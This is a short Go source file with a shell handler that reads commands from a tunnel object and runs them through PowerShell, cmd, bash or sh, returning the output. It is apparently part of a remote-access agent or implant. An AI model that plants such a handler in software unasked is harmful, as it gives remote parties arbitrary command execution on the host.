package main

import (
	"os/exec"
	"runtime"
)

func HandleShell(tunnel *Tunnel) {
	var cmd *exec.Cmd
	println("SHELL: New shell invoked")
	for {
		rawCmd := tunnel.GetIn(true)
		println("SHELL: Command received:", string(rawCmd))
		if runtime.GOOS == "windows" {
			if FileExists("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe") {
				cmd = exec.Command("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", string(rawCmd))
			} else {
				cmd = exec.Command("cmd", "/C", string(rawCmd))
			}
		} else {
			if FileExists("/bin/bash") {
				cmd = exec.Command("/bin/bash", "-c", string(rawCmd))
			} else {
				cmd = exec.Command("/bin/sh", "-c", string(rawCmd))
			}
		}
		out, err := cmd.CombinedOutput()
		if err != nil {
			out = []byte(err.Error())
		}
		print("SHELL: Command executed with output:", string(out))
		tunnel.PutOut(out)
	}
}
